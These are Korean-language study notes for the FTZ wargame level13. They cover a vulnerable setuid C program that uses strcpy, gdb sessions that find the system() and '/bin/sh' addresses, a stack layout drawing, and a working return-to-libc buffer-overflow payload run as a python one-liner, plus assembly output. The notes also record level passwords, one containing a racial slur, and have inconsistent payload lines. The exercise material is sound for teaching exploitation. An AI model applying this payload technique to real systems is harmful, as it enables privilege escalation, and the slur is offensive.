
  level13 비밀번호 = have no clue

  - strcpy : 입력 값의 길이를 검증하지 않기 때문에 BoF에 취약한 함수

  1. 스택 가드
  - BoF 취약점을 방지하기 위해서 개발된 기능 (완벽하지는않다, 4byte or 8byte)
  - 스택 가드에 저장된 값이 변경되면 BoF 공격으로 간주하여 잘못된 메모리 관리로 인하여 프로세스 실행을 종료한다.

  2. 'attackme' 소스 코드

  #include <stdlib.h>

  main(int argc, char *argv[])
  {
     long i=0x1234567;
     char buf[1024];

     setreuid( 3094, 3094 );
     if(argc > 1)
     strcpy(buf,argv[1]);

     if(i != 0x1234567) {
     printf(" Warnning: Buffer Overflow !!! \n");
     kill(0,11);
     }
  }
  1. [참고] gdb 분석 할때
  - 함수 프롤로그 이후에 확보되는 공간이 몇 바이트인지 볼것(확인)
  - 사용하는 함수 유형 및 개수 볼것(확인)
  - 함수가 호출되기 이전에 스택에 push 되는 값을 볼것(확인)
  - 지역 변수의 위치가 어디인지 ex ) ebp-x << 같은것 볼것(확인)

  2. [참고] gdb 분석하고 스택 구조 그림
   [낮은 주소]
           buf   1024     a* 1024개
           dummy 12byte   a* 12개
           i     4byte    <- 0x1234567
           dummy 8byte    a* 8개
           SFP   4byte    a* 4개
           ret   4byte    <- system 함수 주소 값
           argc  4byte    a* 4개
           argv  4byte    <- /bin/sh 주소 값



   [높은 주소]

  1) system 함수 주소 찾기

  (gdb) b *main
 Breakpoint 2 at 0x80484a0
 (gdb) run
 The program being debugged has been started already.
 Start it from the beginning? (y or n)
 Please answer y or n.
 The program being debugged has been started already.
 Start it from the beginning? (y or n)
 Please answer y or n.
 The program being debugged has been started already.
 Start it from the beginning? (y or n) y
 Starting program: /home/level13/tmp/attackme aaaaaaaa

 Breakpoint 2, 0x080484a0 in main ()
 (gdb) print system
 $1 = {<text variable, no debug info>} 0x4203f2c0 <system>
 (gdb) quit
 A debugging session is active.

         Inferior 1 [process 2349] will be killed.

 Quit anyway? (y or n) y

 2) /bin/sh 주소 찾기
  /bin/sh = 0x42127ea4

 #include <stdio.h>

 int main()
 {
   long shell = 0x4203f2c0;

   while(memcmp((void *)shell, "/bin/sh", 8)){
     ++shell;
   }

   printf("/bin/sh = %p\n",shell);


 }
  - gcc -o shell shell.c

 3) system 함수 주소 & /bin/sh 주소 & 스택 가드 -> 리틀 엔디안 방식으로 변경
   system 함수    0x4203f2c0      \xc0\xf2\x03\x42
   /bin/sh 함수   0x42127ea4      \xa4\x7e\x12\x42
   스택 가드      0x01234567      \x67\x45\x23\x01

 4) RTL을 이용한 BoF 공격 페이로드 제작
 "a"*268+"\wc0\xf2\x03\x42"+"aaaa"+"\xa4\x7e\x12\x42"
 "a"*1236 + "\x67\x45\x23\x01" + "a"*12 + "\xc0\xf2\x03\x42" + "a"*4 + "\xa4\x7e\x12\x42"

 ./attackme `python -c 'print("a"*1236 + "\x67\x45\x23\x01" + "a"*12 + "\xc0\xf2\x03\x42" + "a"*4 + "\xa4\x7e\x12\x42")'`
 - (" Warnning: Buffer Overflow !!! \n"); 메세지가 출력된다.

 ./attackme `python -c 'print("a"*1036 + "\x67\x45\x23\x01" + "a"*12 + "\xc0\xf2\x03\x42" + "a"*4 + "\xa4\x7e\x12\x42")'`



level14 =  what that nigga want



  6. 'attackme' 어셈블리어 분석

  [level13@ftz tmp]$ gcc -S -o attackme.a attackme.c
  [level13@ftz tmp]$ cat attackme.a

  .globl main
          .type   main,@function
  main:
          pushl   %ebp
          movl    %esp, %ebp
          subl    $1048, %esp
          andl    $-16, %esp
          movl    $0, %eax
          subl    %eax, %esp
          movl    $19088743, -12(%ebp)
          subl    $8, %esp
          pushl   $3094
          pushl   $3094
          call    setreuid
          addl    $16, %esp
          cmpl    $1, 8(%ebp)
          jle     .L2
          subl    $8, %esp
          movl    12(%ebp), %eax
          addl    $4, %eax
          pushl   (%eax)
          leal    -1048(%ebp), %eax
          pushl   %eax
          call    strcpy
          addl    $16, %esp
  .L2:
          cmpl    $19088743, -12(%ebp)
          je      .L3
          subl    $12, %esp
          pushl   $.LC0
          call    printf
          addl    $16, %esp
          subl    $8, %esp
          pushl   $11
          pushl   $0
          call    kill
          addl    $16, %esp
  .L3:
          leave
          ret
